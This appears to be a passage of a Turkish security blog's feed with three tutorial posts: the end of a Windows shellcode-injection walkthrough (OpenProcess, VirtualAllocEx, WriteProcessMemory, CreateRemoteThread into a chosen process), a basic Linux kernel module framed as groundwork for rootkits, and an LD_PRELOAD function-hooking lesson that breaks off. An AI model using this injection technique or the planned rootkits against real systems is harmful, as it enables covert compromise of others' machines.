		 &quot;\x17\x26\x40\x6d\x05\xa1\x62\x7f&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Şimdi sıra geldi bu &lt;strong&gt;Shellcode&lt;/strong&gt;‘u belirteceğimiz &lt;strong&gt;process&lt;/strong&gt;‘in içine eklemeye.&lt;/p&gt;

&lt;p&gt;Herşeyden önce bizim &lt;strong&gt;process&lt;/strong&gt; içerisine bu &lt;strong&gt;shellcode&lt;/strong&gt;‘u eklememiz için o &lt;strong&gt;process&lt;/strong&gt;‘i açmamız gerekiyor.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HANDLE processwithpid = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Fonksiyon&lt;/strong&gt;‘nun ne işe yaradığını açıklamak ile uğraşmayacağım ama ben merak ettim diyen varsa aşşağıya bu fonksiyonun windows tarafından açıklandığı dökümantasyonunu bırakıyorum :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-openprocess&quot;&gt;OpenProcess Win API&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;HANDLE&lt;/strong&gt;‘mizi oluşturup içerisine &lt;strong&gt;OpenProcess&lt;/strong&gt;‘e 3. parametre olarak &lt;strong&gt;Inject&lt;/strong&gt; olmak istediğimiz &lt;strong&gt;Process PID&lt;/strong&gt;‘sini verip &lt;strong&gt;process&lt;/strong&gt;‘imizi açıyoruz.&lt;/p&gt;

&lt;p&gt;Bundan sonra &lt;strong&gt;VirtualAllocEx&lt;/strong&gt; fonksiyonunu kullanarak oluşturduğumuz &lt;strong&gt;shellcode&lt;/strong&gt;‘un boyutu kadar &lt;strong&gt;process&lt;/strong&gt; içerisinde alan ayırıyoruz :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; PVOID joinprocess = VirtualAllocEx(processwithpid, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Basit bir şekilde &lt;strong&gt;VirtualAllocEx&lt;/strong&gt;‘in nasıl kullanıldığına ve parametrelerinin neler olduğuna bakmak isteyen olursa buradan ulaşabilir &lt;strong&gt;windows&lt;/strong&gt; tarafından oluşturulmuş &lt;strong&gt;dökümantasyonuna&lt;/strong&gt;  :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualallocex&quot;&gt;VirtualAllocEx Win API&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Şimdi sıra geldi bu &lt;strong&gt;process&lt;/strong&gt; içerisinde oluşturduğumuz &lt;strong&gt;alan&lt;/strong&gt;‘ın içerisine bizim &lt;strong&gt;shellcode&lt;/strong&gt;‘umuzu yazmaya yani &lt;strong&gt;Inject&lt;/strong&gt; etmeye :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; WriteProcessMemory(processwithpid, joinprocess, shellcode, sizeof shellcode, NULL);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Bunuda &lt;strong&gt;WriteProcessMemory&lt;/strong&gt; ile yapabiliyoruz. &lt;strong&gt;Windows&lt;/strong&gt; tarafından oluşturulmuş &lt;strong&gt;dökümantasyonuna&lt;/strong&gt; ulaşmak için :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-writeprocessmemory&quot;&gt;WriteProcessMemory Win API&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Şimdi bir &lt;strong&gt;thread&lt;/strong&gt; oluşturup tüm bu yukarıda gerçekleştirdiğimiz işlemleri gerçekleştirmeye geldi sıra :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; HANDLE threadhandler = CreateRemoteThread(processwithpid, NULL, 0, (LPTHREAD_START_ROUTINE)joinprocess, NULL, 0, NULL);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Bunuda &lt;strong&gt;CreateRemoteThread&lt;/strong&gt; fonksiyonu ile yapabiliyoruz onunda &lt;strong&gt;windows&lt;/strong&gt; tarafından oluşturulmuş &lt;strong&gt;dökümantasyonuna&lt;/strong&gt; buradan ulaşabilirsiniz :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createremotethread&quot;&gt;CreateRemoteThread Win API&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Ve son olarak bu thread’i kapamaya geldi sıra :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; CloseHandle(processwithpid);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Yukarıda ki tüm kodların birleşimine buradan ulaşıp derleyebilirsiniz : &lt;a href=&quot;https://pastebin.com/1gPb1PAM&quot;&gt;Pastebin&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;# Demo&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Derledikten&lt;/strong&gt; sonra nasıl çalışıp &lt;strong&gt;putty&lt;/strong&gt; içerisine &lt;strong&gt;shellcode&lt;/strong&gt; &lt;strong&gt;injection&lt;/strong&gt; ettiğimizi gösteren küçük bir gizli youtube videosu :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://youtu.be/oaNvWM9k84g&quot;&gt;Demo Video&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Yazı hakkında aklınızda soru işareti varsa twitter hesabım : &lt;a href=&quot;https://www.twitter.com/0DAYanc&quot;&gt;@0DAYanc&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">Process Shellcode Injection</summary></entry><entry><title type="html">Loadable Kernel Module Development</title><link href="http://localhost:4000/2019/04/22/loadable-kernel-module.html" rel="alternate" type="text/html" title="Loadable Kernel Module Development" /><published>2019-04-22T00:00:00+03:00</published><updated>2019-04-22T00:00:00+03:00</updated><id>http://localhost:4000/2019/04/22/loadable-kernel-module</id><content type="html" xml:base="http://localhost:4000/2019/04/22/loadable-kernel-module.html">&lt;h1 id=&quot;loadable-kernel-module-lkm&quot;&gt;Loadable Kernel Module (LKM)&lt;/h1&gt;

&lt;p&gt;Merhaba arkadaşlar. &lt;strong&gt;Loadable Kernel Module (LKM)&lt;/strong&gt; yazıma hoşgeldiniz.&lt;/p&gt;

&lt;p&gt;Bu yazımda sizlere &lt;strong&gt;Yüklenebilir Çekirdek Modülünün&lt;/strong&gt; yani &lt;strong&gt;LKM&lt;/strong&gt;‘nin geliştirilmesinden bahsedeceğim. Dürüst olursam benim bu, önceki ve ilerideki gelecek yazılarımdan bahsetmiş ve bahsedecek olma sebebim rootkit geliştirebilesiniz diye ama insanlık adına kullanacağım diyen olursa oda kabulumdur.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;LKM&lt;/strong&gt; rootkit geliştirilmesinin en basit yoludur ayrıca bu karşısında basitçe savunma kurabileceğiniz bir yoldur. İşletim sisteminde bir kere root alındıktan sonra rootkit bu yetkiyi kontrol etmenin en iyi yoludur. Bunuda ek bilgi olarak verdiğime göre artık yazımıza geçip &lt;strong&gt;LKM&lt;/strong&gt;‘nin nasıl yazıldığından bahsedelim.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;LKM&lt;/strong&gt;‘yi &lt;strong&gt;kernel&lt;/strong&gt; yani &lt;strong&gt;çekirdek&lt;/strong&gt; için bir eklenti olarak düşünebiliriz ayrıca &lt;strong&gt;LKM&lt;/strong&gt; size bulunduğunuz yetkiler ile &lt;strong&gt;kernel&lt;/strong&gt; içerisinde kod çalıştırmanızı sağlar. &lt;strong&gt;LKM&lt;/strong&gt; az çok kafanızda bunun ne olduğu canlandıysa devam edelim.&lt;/p&gt;

&lt;h1 id=&quot;i̇lk-yüklenebilir-çekirdek-modülümüz&quot;&gt;İlk Yüklenebilir Çekirdek Modülümüz&lt;/h1&gt;
&lt;p&gt;Bu modülü yazmadan önce bize kütüphanelerimiz gerek her programda olduğu gibi :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;linux/module.h&amp;gt;
#include &amp;lt;linux/init.h&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Bu kısımdan sonra bu modül hakkında bilgileri verdiğimiz kısım geliyor :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;MODULE_AUTHOR(&quot;blacknbunny&quot;);
MODULE_DESCRIPTION(&quot;Basit Merhaba Dunya Modulu&quot;);
MODULE_LICENSE(&quot;GPL&quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Modülü kimin yazdığı, modül hakkında açıklama ve lisans yer alıyor bu kısımda.&lt;/p&gt;

&lt;p&gt;Bu kısmıda anladığımıza göre biraz daha teknik bölüm olan yükleme kısmına gelelim :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;static int __init merhaba_init(void)
{
  printk(&quot;Merhaba Dünya!\n&quot;);
  return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Bu kısımda modülümüz kernel’e yüklendikten sonra çalışma aşamasında ne yapacağını belirliyor.&lt;/p&gt;

&lt;p&gt;Fonksiyon tipimizi ve return tipini belirledikten sonra burada karşımıza çıkan farklı bir fonksiyon var oda &lt;strong&gt;printk&lt;/strong&gt; fonksiyonu.&lt;/p&gt;

&lt;p&gt;Bu fonksiyon adındanda anlaşılabileceği gibi kernel içerisinde yazdırma yapan bir fonksiyon bu. Daha da detaylı incelemek istiyorum diyen varsa aranızda buyurun &lt;a href=&quot;https://en.wikipedia.org/wiki/Printk&quot;&gt;Wikipedia printk&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Kernel içerisinde modülümüz aracılığı ile “Merhaba Dünya” yazdırdık fakat her girişin bir çıkışıda vardır &lt;strong&gt;I/O&lt;/strong&gt; mantığı gibi düşünün. Günün sonunda bunu nasıl kernel içerisine install edeceğimizi göreceğin &lt;strong&gt;insmod&lt;/strong&gt; komutu ile yalnız bunu birde kernelin içinden çıkarmak var bunuda &lt;strong&gt;rmmod&lt;/strong&gt; ile yapabiliyoruz.&lt;/p&gt;

&lt;p&gt;Rootkitimizi karşıdaki sisteme yükleyip uçup kaçtıktan sonra bu rootkit modülünü sistemden çıkartmamız gerekebilir. O zamanda rootkit içerisinde bir çıkış fonksiyonunun bulunması gerekebilir tabi bu basit bir &lt;strong&gt;LKM&lt;/strong&gt; olduğundan detaya girmiyorum.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;static void __exit merhaba_exit(void)
{
  printk(&quot;Hello world kernelden cikartiliyor.\n&quot;);
  return;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Bu şekilde de modülümüzü kernel içerisinden &lt;strong&gt;Unload&lt;/strong&gt; edebiliyoruz. Şimdi geldi son kodumuza tüm bu &lt;strong&gt;__init&lt;/strong&gt; ve &lt;strong&gt;__exit&lt;/strong&gt; fonksiyonlarını modül içine yüklemeye :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;module_init(merhaba_init);
module_exit(merhaba_exit);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ve &lt;strong&gt;module_init&lt;/strong&gt; ile yüklenmenin &lt;strong&gt;module_exit&lt;/strong&gt; ilede çıkarılmanın gerçekleştiğini görebiliyoruz.&lt;/p&gt;

&lt;p&gt;Şimdi geriye kalan tüm bu kodu birleştirip bir adet &lt;strong&gt;Makefile&lt;/strong&gt; dosyası oluşturup &lt;strong&gt;make&lt;/strong&gt; komutu ile derlemek.&lt;/p&gt;

&lt;p&gt;Alttaki &lt;strong&gt;LKM&lt;/strong&gt;‘yi &lt;strong&gt;merhaba.c&lt;/strong&gt; olarak kaydettiğinizi varsayıyorum.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;linux/module.h&amp;gt;
#include &amp;lt;linux/init.h&amp;gt;

MODULE_AUTHOR(&quot;blacknbunny&quot;);
MODULE_DESCRIPTION(&quot;Basit Merhaba Dunya Modulu&quot;);
MODULE_LICENSE(&quot;GPL&quot;);

static int __init merhaba_init(void)
{
  printk(&quot;Merhaba Dünya!\n&quot;);
  return 0;
}

static void __exit merhaba_exit(void)
{
  printk(&quot;Hello world kernelden cikartiliyor.\n&quot;);
  return;
}

module_init(merhaba_init);
module_exit(merhaba_exit);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;make-ile-lkm-derlenmesi&quot;&gt;Make ile LKM derlenmesi&lt;/h1&gt;
&lt;p&gt;Bu modülü derlemek içinde komut satırımızdan yada bir pad ile &lt;strong&gt;Makefile&lt;/strong&gt; adında bir dosya oluşturup içine eklememiz lazım.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;obj-m += merhaba.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Derlemeyi gerçekleştirmek için alttaki komut satırında gerçekleştirdiğim komutları kullanabilirsiniz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;remnux@remnux:~/heyhey$ ls
Makefile  merhaba.c
remnux@remnux:~/heyhey$ make
make -C /lib/modules/3.13.0-53-generic/build M=/home/remnux/heyhey modules
make[1]: Entering directory `/usr/src/linux-headers-3.13.0-53-generic'
  CC [M]  /home/remnux/heyhey/merhaba.o
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /home/remnux/heyhey/merhaba.mod.o
  LD [M]  /home/remnux/heyhey/merhaba.ko
make[1]: Leaving directory `/usr/src/linux-headers-3.13.0-53-generic'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;make&lt;/strong&gt; komutu sonrasında tekrar &lt;strong&gt;ls&lt;/strong&gt; komutunu çalıştırdığımızda klasörümüzdeki dosya sayısının arttığını görebiliriz :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;remnux@remnux:~/heyhey$ ls
Makefile   merhaba.ko     merhaba.mod.o  modules.order
merhaba.c  merhaba.mod.c  merhaba.o      Module.symvers
remnux@remnux:~/heyhey$
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Bu dosyaların arasından bizim modülümüz &lt;strong&gt;merhaba.ko&lt;/strong&gt;. Bu modülü kernel içerisine &lt;strong&gt;load&lt;/strong&gt; edebilmemiz yani yükleyebilmemiz için başta da bahsettiğimiz &lt;strong&gt;insmod&lt;/strong&gt; komutunu kullanmamız gerekli.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;remnux@remnux:~/heyhey$ insmod ./merhaba.ko
insmod: ERROR: could not insert module ./merhaba.ko: Operation not permitted
remnux@remnux:~/heyhey$ sudo insmod ./merhaba.ko
remnux@remnux:~/heyhey$ dmesg | tail -n 1
[ 6350.260783] Merhaba D\xffffffc3\xffffffbc\xffffffbcnya!
remnux@remnux:~/heyhey$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;insmod&lt;/strong&gt; ile bunu kernele yükleyip &lt;strong&gt;dmesg&lt;/strong&gt; ile incelediğimizde kernelde bize gelen &lt;strong&gt;Merhaba Dünya&lt;/strong&gt; çıktısını görebiliriz. Yalnız kernel içerisinde türkçe karakter kullanımı mevcut olmadığından ve size bunuda ek olarak göstermek istediğimden çıktıyı &lt;strong&gt;hex code&lt;/strong&gt;‘ları ile almış bulunuyoruz.&lt;/p&gt;

&lt;p&gt;Modülümüzün sağlıklı şekilde çalıştığını gözlemledik ve eğer bu modülü silmek istiyorsak &lt;strong&gt;rmmod&lt;/strong&gt; komutunu kullanabiliriz :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;remnux@remnux:~/heyhey$ sudo rmmod merhaba
remnux@remnux:~/heyhey$ dmesg | tail -n 1
[ 6593.845495] Hello world kernelden cikartiliyor.
remnux@remnux:~/heyhey$
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ve çıkartılma sonucunda bizim modülümüz içerisinde belirlediğimiz &lt;strong&gt;__exit&lt;/strong&gt; fonksiyonu çalıştı.&lt;/p&gt;

&lt;p&gt;Eğer modülleri listelemek istiyorsanız &lt;strong&gt;lsmod&lt;/strong&gt; komutunu kullanabilirsiniz örneğin :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;remnux@remnux:~/heyhey$ lsmod | grep merhaba
merhaba                12427  0 
remnux@remnux:~/heyhey$
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Bu yazımızda basit bir şekilde &lt;strong&gt;LKM&lt;/strong&gt; yani &lt;strong&gt;Yüklenebilir Çekirdek Modülünü&lt;/strong&gt; en basit şeklinde geliştirmeyi öğrendik.&lt;/p&gt;

&lt;p&gt;Bir daha ki yazımda büyük ihtimal &lt;strong&gt;sys_call_table hijacking&lt;/strong&gt; anlatacağım.&lt;/p&gt;

&lt;p&gt;Sonra ki yazılarda da artık bir rootkit yazarız diye düşünüyorum. Kendinize iyi bakın görüşmek dileği ile !&lt;/p&gt;</content><author><name></name></author><summary type="html">Loadable Kernel Module (LKM)</summary></entry><entry><title type="html">Linux Function Hooking</title><link href="http://localhost:4000/2019/04/14/Linux-Function-Hooking.html" rel="alternate" type="text/html" title="Linux Function Hooking" /><published>2019-04-14T00:00:00+03:00</published><updated>2019-04-14T00:00:00+03:00</updated><id>http://localhost:4000/2019/04/14/Linux-Function-Hooking</id><content type="html" xml:base="http://localhost:4000/2019/04/14/Linux-Function-Hooking.html">&lt;h1 id=&quot;linux-load-time-function-hooking&quot;&gt;Linux Load-Time Function Hooking&lt;/h1&gt;

&lt;p&gt;Uzun bir süreden sonra bloguma yazı yazıyorum. 2019’un ilk blog yazısı olacak umarım yazıyı beğenirsiniz.&lt;/p&gt;

&lt;p&gt;Öncelikle işi fazla komplekste itmeden size başlıktaki bazı terimleri açıklayarak başlamak istiyorum.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;ul&gt;
    &lt;li&gt;&lt;strong&gt;Load-Time : Bir yazılım çalışmaya başlamadan önce bir yüklenme zamanı vardır. Program tam olarak çalışabilir hale gelene kadar gereksinimlerini kendine yükler örneğin (Libraries, Memory Regions)&lt;/strong&gt;&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;ul&gt;
    &lt;li&gt;&lt;strong&gt;Function Hooking : Yazılım içerisinde verilen bir fonksiyonu sahte bir fonksiyonla değiştirmek, düzenlemek.&lt;/strong&gt;&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;p&gt;Anlamakta biraz zorlandıysanız hiç problem değil ileri de bu terimleri daha da detaylı inceleyeceğiz.
&lt;br /&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;h1 id=&quot;bir-yazılımın-kullandığı-syscalları-görmek&quot;&gt;Bir yazılımın kullandığı syscalları görmek&lt;/h1&gt;
&lt;p&gt;Yazılım içerisinde kullanılan sistem çağrılarını(syscalls) görmek için linuxta çoğunluk tarafından kullanılan &lt;strong&gt;strace&lt;/strong&gt; binarysini kullanabilirsiniz.
&lt;strong&gt;strace&lt;/strong&gt; çalıştıktan sonra örnek bir çıktı :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;remnux@remnux:~/hoq$ strace ./ornek
execve(&quot;./ornek&quot;, [&quot;./ornek&quot;], [/* 53 vars */]) = 0
brk(0)                                  = 0x61f000
access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f8786da4000
access(&quot;/etc/ld.so.preload&quot;, R_OK)      = -1 ENOENT (No such file or directory)
open(&quot;/etc/ld.so.cache&quot;, O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=108273, ...}) = 0
mmap(NULL, 108273, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f8786d89000
close(3)                                = 0
access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)
open(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;, O_RDONLY|O_CLOEXEC) = 3
read(3, &quot;\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0&amp;gt;\0\1\0\0\0\320\37\2\0\0\0\0\0&quot;..., 832) = 832
fstat(3, {st_mode=S_IFREG|0755, st_size=1840928, ...}) = 0
mmap(NULL, 3949248, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f87867bf000
mprotect(0x7f878697a000, 2093056, PROT_NONE) = 0
mmap(0x7f8786b79000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1ba000) = 0x7f8786b79000
mmap(0x7f8786b7f000, 17088, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f8786b7f000
close(3)                                = 0
mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f8786d88000
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f8786d86000
arch_prctl(ARCH_SET_FS, 0x7f8786d86740) = 0
mprotect(0x7f8786b79000, 16384, PROT_READ) = 0
mprotect(0x600000, 4096, PROT_READ)     = 0
mprotect(0x7f8786da6000, 4096, PROT_READ) = 0
munmap(0x7f8786d89000, 108273)          = 0
fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 2), ...}) = 0
mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f8786da3000
write(1, &quot;Hello world !\n&quot;, 14Hello world !
)         = 14
exit_group(14)                          = ?
+++ exited with 14 +++
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h1 id=&quot;başlangıç&quot;&gt;Başlangıç&lt;/h1&gt;

&lt;p&gt;Şimdi linuxu açıp aşşağıda bulunan kodu derlediğimizi var sayıyorum :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;

int main(){

  puts(&quot;Hello world !&quot;);

}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Derleme : &lt;code class=&quot;highlighter-rouge&quot;&gt;gcc ornek.c -o ornek&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Şimdi bizim yapacağımız şey bu &lt;strong&gt;puts&lt;/strong&gt; fonksiyonunu çalışma &lt;strong&gt;zamanında(load-time)&lt;/strong&gt; verdiğimiz sahte &lt;strong&gt;puts&lt;/strong&gt; ile değiştirmek. Böylelikle programda yazan &lt;strong&gt;fonksiyon&lt;/strong&gt; değil bizim yazdığımız &lt;strong&gt;fonksiyon&lt;/strong&gt; çalışıcak.&lt;/p&gt;

&lt;hr /&gt;
&lt;h1 id=&quot;fonksiyonu-hook-etmek-için-gerekli-kütüphanenin-yazılması&quot;&gt;Fonksiyonu hook etmek için gerekli kütüphanenin yazılması&lt;/h1&gt;
&lt;p&gt;Kütüphanelerimizi ekleyerek başlayalım :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;dlfcn.h&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Sonra hangi fonksiyonu hooklayacağımızı belirleyelim :&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int puts(const char *message) {


}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Burada verilen fonksiyon ve parametreler çok önemli hook edeceğiniz fonksiyonun parametresini ve tipini vermemiz gerek.&lt;/p&gt;

&lt;p&gt;Sonrasında orjinal fonksiyonun sahtesini oluşturmamız gerekiyor.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int (*new_puts)(const char *message);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ve meşhur &lt;strong&gt;dlsym&lt;/strong&gt; fonksiyonuna geldik. Başta eklediğim &lt;strong&gt;dlfcn.h&lt;/strong&gt; library’sinden gelen bu küçük ama işlevi  &lt;strong&gt;Function hooking’de&lt;/strong&gt; çok büyük olan bu fonksiyonu anlatmaya başlayalım&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;new_puts = dlsym(RTLD_NEXT, &quot;puts&quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Bu fonksiyon iki adet argüman alıyor. Bunlardan ilki olan &lt;strong&gt;RTLD_NEXT&lt;/strong&gt; enum’u &lt;strong&gt;dynamic loader API&lt;/strong&gt; kısmına 2. argüman ile bağlantılı bir sonraki örneğe dönmesini söylüyor. Son argüman ise dönülecek örneğin ismini istiyor ve buda bizim yerine sahtesini koyacağımız &lt;strong&gt;puts&lt;/strong&gt; fonksiyonu.&lt;/p&gt;

&lt;p&gt;Ve son olarak :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;return new_puts(&quot;Hooked Message&quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;İle kütüphanemizi yazıyoruz ve &lt;strong&gt;libornek.c&lt;/strong&gt; adıyla kaydediyoruz. Şimdi sıra geldi bu kütüphaneyi oyunda asıl yeri alan &lt;strong&gt;LD_PRELOAD&lt;/strong&gt; ortam değişkenine(enviroment variable) atamaya.&lt;/p&gt;

